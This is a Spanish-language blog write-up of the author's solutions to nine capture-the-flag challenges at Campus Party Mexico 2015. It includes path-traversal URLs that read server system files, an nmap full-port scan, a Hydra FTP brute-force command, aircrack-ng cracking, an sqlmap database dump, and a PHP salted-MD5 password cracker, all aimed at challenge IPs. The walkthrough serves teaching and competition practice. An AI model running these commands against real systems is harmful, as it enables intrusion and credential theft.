---
title: 'Solución al reto Capture The Flag de #CPMX6'
author: Alevsk
type: post
date: 2015-07-30T01:47:40+00:00
url: /2015/07/solucion-al-reto-capture-the-flag-de-cpmx6/
categories:
  - Ethical Hacking
  - Networking
  - Personal
  - Technology
  - Tips
  - Tutorials
tags:
  - campus party
  - hacking
  - Social Media
  - software libre
  - Solutions
  - Technology
  - Tutorials

---
[![dc-flag](/images/dc-flag.jpg)](http://www.alevsk.com/2015/07/solucion-al-reto-capture-the-flag-de-cpmx6/dc-flag/)

Otro año, otro **campus party** al que asisto. En esta ocasión me di tiempo de asistir a varias conferencias y workshops que se impartieron durante el evento (y no solo pasármela en la zona gamer :p), además, al igual que en el evento pasado también estuve participando en el reto de seguridad que fue organizado por el **Instituto Tecnológico Superior de Atlixco**.

El **wargame** estuvo muy divertido (horas y horas de diversión) y me ayudo a conocer a mas colegas de la **seguridad informática** durante el evento, bueno sin mas preámbulo comienzo a explicar en que consistía cada uno de los retos y como fue que llegue a la solución.

# Reto #1

Comenzando con lo básico, en el reto uno nos daban la IP donde había alojada una pagina web, la pagina tenia varias pestañas y la URL de cada una de las secciones tenia una estructura como la siguiente:

```bash
http://52.11.240.182/index.php?file=contacto.html
```

Jugando un poco con el parámetro file vemos que el sitio tiene una vulnerabilidad de Local File Inclusión. Utilizando la herramienta que desarrollo mi amigo [@lightOS](http://twitter.com/lightOS) para explotar este tipo de vulnerabilidad [https://github.com/lightos/Panoptic](https://github.com/lightos/Panoptic) es posible automatizar el proceso y obtener archivos importantes del servidor, por ejemplo:

```bash
http://52.11.240.182/index.php?file=../../../../../../../../../../etc/apache2/envvars  
http://52.11.240.182/index.php?file=../../../../../../../../../../etc/logrotate.d/apache2
``` 

[![ctf_cpmx_1](/images/ctf_cpmx_1.jpg)](http://www.alevsk.com/2015/07/solucion-al-reto-capture-the-flag-de-cpmx6/ctf_cpmx_1/)

Sin embargo, el reto es mas sencillo que eso, en el archivo robots.txt (corrimos un dirbuster al sitio web) vimos que hay un archivo llamado dir.txt, revisando su contenido nos encontramos:

```bash
$ ls -l  
html/  
secreto.txt
```

secreto.txt, un archivo interesante, entonces aprovechamos el Local File Inclusion que teníamos y cargamos este archivo.

```bash
http://52.11.240.182/index.php?file=../secreto.txt
```

[![ctf_cpmx_2](/images/ctf_cpmx_2.jpg)](http://www.alevsk.com/2015/07/solucion-al-reto-capture-the-flag-de-cpmx6/ctf_cpmx_2/) 

**67d71184adf4b700d5cadce0c9bfdcc7e91d01cb** <- esta es la bandera del reto 🙂 

## Reto #2

El segundo reto nos daba como pista “DNS record types" junto con un dominio gcs-ibero.com, si es la primera vez que escuchan de record types en el siguiente enlace podrán encontrar mas información [https://en.wikipedia.org/wiki/List_of_DNS_record_types](https://en.wikipedia.org/wiki/List_of_DNS_record_types)

Entendiendo un poco mas sobre el tema comenzamos a hacer lookup a los distintos records hasta que llegamos al **record TXT** [http://mxtoolbox.com/TXTLookup.aspx](http://mxtoolbox.com/TXTLookup.aspx) y encontramos la solución.

[![ctf_cpmx_3](/images/ctf_cpmx_3.png)](http://www.alevsk.com/2015/07/solucion-al-reto-capture-the-flag-de-cpmx6/ctf_cpmx_3/)

**4db055f7386c6bb8a14b5883417a4b61** <- es la bandera de este reto 

## Reto #3

El reto numero 3 es bastante interesante, al inicio nos dan una captura de paquetes, un archivo **.pcapng** que procedemos a visualizar con **wireshark** (si no han escuchado de el o no saben utilizarlo ahora es el momento [https://www.wireshark.org/](https://www.wireshark.org/)) 

[![ctf_cpmx_4](/images/ctf_cpmx_4.png)](http://www.alevsk.com/2015/07/solucion-al-reto-capture-the-flag-de-cpmx6/ctf_cpmx_4/)

Como podemos observar hay partes de la lectura que están cifradas (ahí se ve una negociación **TLS**), por suerte entre los archivos que nos daban también venia una llave privada (**llave.pem**) que nos servirá para descifrar esas partes. En **Wireshark** nos vamos al menú **Edit > Preferences** y en la siguiente ventana del lado derecho seleccionamos **Protocol > SSL**

[![ctf_cpmx_5](/images/ctf_cpmx_5.png)](http://www.alevsk.com/2015/07/solucion-al-reto-capture-the-flag-de-cpmx6/ctf_cpmx_5/)

Damos clic en **RSA keys** list y agregamos una nueva llave, nos pedirá algunos datos como dirección IP, puerto, protocolo y la llave privada (**llave.pem**), haciendo un análisis de lo que teníamos anteriormente:

En la captura tenemos dos direcciones IP:

  * 192.168.15.7 (dirección local)
  * 52.27.174.204 (dirección remota a la que nos estamos comunicando)

De igual forma, viendo la captura, sabemos que la comunicación con la maquina remota fue atreves de **ftp** utilizando el puerto 21 (por default) por lo tanto escribimos esos datos y adjuntamos la llave privada como se muestra en la siguiente imagen.

[![ctf_cpmx_6](/images/ctf_cpmx_6.png)](http://www.alevsk.com/2015/07/solucion-al-reto-capture-the-flag-de-cpmx6/ctf_cpmx_6/)
[![ctf_cpmx_7](/images/ctf_cpmx_7.png)](http://www.alevsk.com/2015/07/solucion-al-reto-capture-the-flag-de-cpmx6/ctf_cpmx_7/)

Damos ok a las ventanas y **Wireshark** nos debería de mostrar el trafico descifrado. Para analizar mas rápido vamos a pasar la captura a un archivo de texto, **File > Print**. Seleccionamos Plaint Text y Output to file.

[![ctf_cpmx_8](/images/ctf_cpmx_8.png)](http://www.alevsk.com/2015/07/solucion-al-reto-capture-the-flag-de-cpmx6/ctf_cpmx_8/)

Abrimos el archivo generado con nuestro editor de texto favorito y empezamos a buscar por cadenas interesantes como password, pass, secret, etc

[![ctf_cpmx_9](/images/ctf_cpmx_9.png)](http://www.alevsk.com/2015/07/solucion-al-reto-capture-the-flag-de-cpmx6/ctf_cpmx_9/)

La bandera de este reto es: **ZXASDF727fa2raSFP!FRA-,aSF**

# Reto #4

El reto cuatro era facil y consistía en un reto criptográfico, al principio nos daban una cadena de texto que parecía no tener sentido y en mi experiencia la mayoría de los retos de este tipo son **cifrados caesar**. Con la ayuda de google buscamos un sitio para resolver este tipo de cifrados de sustitución por desplazamiento [http://www.xarg.org/tools/caesar-cipher/](http://www.xarg.org/tools/caesar-cipher/)

Introducimos el texto cifrado y obtenemos la respuesta 🙂

[![ctf_cpmx_10](/images/ctf_cpmx_10.png)](http://www.alevsk.com/2015/07/solucion-al-reto-capture-the-flag-de-cpmx6/ctf_cpmx_10/)

**Mas sabe el diablo por viejo que por diablo** <- esta es la bandera del reto 

# Reto #5

_Tip: la bandera es el md5 del contenido del archivo zip._

El reto nos da un archivo comprimido en formato **zip**, que tiene la particularidad que al descomprimirlo nos genera otro **archivo zip**, y después otro y otro mas, parecería nunca acabar, lo primero que hice fue abrir el archivo con un editor hexadecimal solo para corroborar lo que ya sabíamos.

[![ctf_cpmx_11](/images/ctf_cpmx_11.png)](http://www.alevsk.com/2015/07/solucion-al-reto-capture-the-flag-de-cpmx6/ctf_cpmx_11/)

Del lado derecho podemos ver los nombres de los archivos que se van generado: 617.zip, 293.zip, 558.zip, 689.zip, etc. (son bastantes) así que lo mas fácil es realizar un script para descomprimir todo lo que haya que descomprimir recursivamente xd, yo utilice un comando en bash.

```bash
$ while [ "\`find . -type f -name '\*.zip' | wc -l\`" -gt 0 ]; do find -type f -name "\*.zip" -exec unzip — '{}' \; -exec rm — '{}' \;; done
```

[![ctf_cpmx_11](/images/ctf_cpmx_111.png)](http://www.alevsk.com/2015/07/solucion-al-reto-capture-the-flag-de-cpmx6/ctf_cpmx_11-2/)  
Al final del ultimo Zip nos encontramos con un archivo de texto llamado **flag.txt**, calculamos su **hash md5** y obtenemos la bandera 🙂

```bash
$ md5sum flag.txt  
da44354d0de702b12934235a51094813 flag.txt
```

**da44354d0de702b12934235a51094813** <- es la bandera del reto (el hash) 

# Reto #6

El reto 6 nos dio bastante dolor de cabeza a los participantes, a pesar de que su solución era bastante sencilla, en el reto nos daban una dirección IP y se nos pedía utilizar **nmap** [https://nmap.org/](https://nmap.org/) (para escaneo de puertos y servicios) y **Hydra** para realizar **ataques de fuerza bruta**, hubo bastante confusión puesto que a aparentemente el servidor solo tenia corriendo un servicio de ssh y fue lo que intente atacar. 

El **servidor ssh** no soportaba autenticación mediante usuario y contraseña por lo que termine creando script en **bash**, **python**, etc y probando diferentes tipos de exploits sin éxito :(. Me di cuenta que el primer escaneo que realice no fue un barrido completo de puertos, así que volví a escanear nuevamente esta vez asegurándome de revisar todos los puertos.

```bash
$ nmap –sV –p- –version-all –max-retries 1–d IP  
…  
…  
333/tcp open ftp vsftpd 2.0.8 or later  
…  
…  
Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .  
# Nmap done at Fri Jul 24 18:08:31 2015 — 1 IP address (1 host up) scanned in 6.26 seconds
```

Y ahora si encontramos que en el puerto 333 había un servidor de ftp corriendo.  
Empezamos a analizar el servicio, tratamos de conectarnos y vemos como responde.

Intentando conectarse con el usuario admin

```bash
$ ftp admin @ 52.26.250.230 333  
Connected to 52.26.250.230.  
220 Welcome to FTP service.  
331 Please specify the password.  
Password:  
530 Login incorrect.  
ftp: Login failed  
ftp> exit  
221 Goodbye.
```

Intentando conectarse con el usuario root

```bash
$ ftp root @ 52.26.250.230 333  
Connected to 52.26.250.230.  
220 Welcome to FTP service.  
530 Permission denied.  
ftp: Login failed  
ftp> exit  
221 Goodbye.
```

El usuario admin parece ser valido (vean como las respuestas son diferentes), pero no tenemos la contraseña, utilizaremos **hydra** y un buen diccionario, al final y después de un par de horas obtuvimos la contraseña 🙂

```bash
$ hydra -t 1 -l admin -P default\_pass\_for\_services\_unhash.txt -vV -s 333 52.26.250.230 ftp
```

[![ctf_cpmx_12](/images/ctf_cpmx_12.png)](http://www.alevsk.com/2015/07/solucion-al-reto-capture-the-flag-de-cpmx6/ctf_cpmx_12/)

La bandera de esto reto era x.x: **12345678** (máximum trolling)

# Reto #7

Otro reto bastante sencillo, aquí nos dan una foto y se nos pide encontrar la marca del dispositivo con el que fue tomado la fotografía.

Utilizamos cualquier extractor de metadatos online [http://regex.info/exif.cgi](http://regex.info/exif.cgi) y obtenemos que la foto fue tomada con una dispositivo Huawei

[![ctf_cpmx_13](/images/ctf_cpmx_13.png)](http://www.alevsk.com/2015/07/solucion-al-reto-capture-the-flag-de-cpmx6/ctf_cpmx_13/)

La bandera del reto es: **Huawei**

# Reto #8

En el reto 8 nos dan un archivo **.iv** que podemos crackear utilizando **aircrack-ng**, para quien no sepa **aircrack** es un software incluido en la distribución de seguridad **Kali** que sirve para **crackear redes inalámbricas** [http://www.aircrack-ng.org/](http://www.aircrack-ng.org/)

En nuestro **kali** utilizamos **aircrack-ng** para procesar el archivo **.iv** del reto:

```bash
$ aircrack-ng captura.iv
```

[![ctf_cpmx_14](/images/ctf_cpmx_14.png)](http://www.alevsk.com/2015/07/solucion-al-reto-capture-the-flag-de-cpmx6/ctf_cpmx_14/)

Y obtenemos la contraseña de la red inalámbrica que también es la solución al reto  
**12345** <- es la bandera de este reto 

# Reto #9

El ultimo reto del capture the flag consistía en explotar una **vulnerabilidad** de **inyección SQL** y obtener la contraseña en texto plano del administrador del sitio. El reto, al inicio nos presenta un sitio web con un catalogo de películas, podemos consultar las películas de un director en especifico con una URL similar a la siguiente:

```bash
http://54.68.213.190/busqueda.php?idDirector=1
```

Esta claro que si queremos inyectar comandos **SQL** tendremos que empezar por el parámetro **idDirector** y para hacerlo de una forma mas rápida y automática utilizaremos la herramienta **sqlmap** [http://sqlmap.org/](http://sqlmap.org/) que viene instalada en nuestro **Kali**.

```bash
$ sqlmap –url=http://54.68.213.190/busqueda.php?idDirector=1 –level=1 –risk=3 –all
```

[![ctf_cpmx_15](/images/ctf_cpmx_15.png)](http://www.alevsk.com/2015/07/solucion-al-reto-capture-the-flag-de-cpmx6/ctf_cpmx_15/)

La herramienta nos hace un dump de la tabla de usuarios y vemos que los passwords son almacenados no en texto plano sino cifrados (probablemente en **md5**), también observamos que la tabla contiene un campo de **salt** y un valor que muy seguramente fue utilizado para calcular el hash de la contraseña.

Pues manos a la obra (o mas bien dicho, al teclado), el reto nos pide encontrar la contraseña del usuario maria (que es el **administrador** del sitio), podemos hacer rápidamente un script para intentar crackear el **hash**.

```php
<?php  
$salt = "WDUOPALD6N";  
$hash = "fa38084963f74741ea1184963fa2cd91";

$handle = fopen("pass2.txt", "r");  
if ($handle) {  
while (($line = fgets($handle)) !== false) {

$line = str_replace("\n", "", $line);

if(md5($salt.$line) == $hash || md5($line.$salt) == $hash)  
{  
echo $line . " OK! \n";  
exit();  
} else {  
echo $line . ":" . md5($salt.$line) . " Nop\n";  
}  
}

fclose($handle);  
} else {  
echo "file error \n";  
} 

?>
```

Lo que hace nuestro script es, con la ayuda de un **diccionario** de 2 millones de contraseñas populares, intentar encontrar cual es el texto plano concatenado al valor salt del hash que obtenemos, para cada contraseña de nuestro diccionario calculamos

  * salt + contraseña = hash
  * Contraseña + salt = hash

Y revisamos si tenemos alguna coincidencia.

[![ctf_cpmx_16](/images/ctf_cpmx_16.png)](http://www.alevsk.com/2015/07/solucion-al-reto-capture-the-flag-de-cpmx6/ctf_cpmx_16/)

Afortunadamente la contraseña en texto plano se encontraba en nuestro diccionario y la pudimos encontrar 🙂

La bandera del reto final era: **passw0rd1** (era la contraseña numero 795975 en nuestro diccionario)

[![ctf_cpmx_17](/images/ctf_cpmx_17.jpg)](http://www.alevsk.com/2015/07/solucion-al-reto-capture-the-flag-de-cpmx6/ctf_cpmx_17/)

Nos vemos el siguiente año.  
Happy hacking 🙂